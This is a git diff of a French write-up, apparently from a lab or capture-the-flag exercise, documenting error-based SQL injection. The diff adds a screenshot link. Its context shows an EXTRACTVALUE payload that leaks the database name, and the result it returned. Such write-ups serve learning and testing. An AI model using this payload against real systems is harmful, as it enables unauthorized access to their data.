@@ -23,6 +23,7 @@ Extraction du nom de la base de données via la fonction `EXTRACTVALUE` qui forc
 * **Payload :** `1 AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT database()), 0x7e))`
 * **Résultat :** `Member_Sql_Injection`
 * **Preuve visuelle :** `screenshots/2. Énumération de la Base de Données.png`
+![Preuve de la vulnérabilité](screenshots/1. Preuve de la vulnérabilité (Détection).png)
 
 ### Étape 3 : Énumération des Tables
 Identification des tables présentes dans la base de données identifiée.
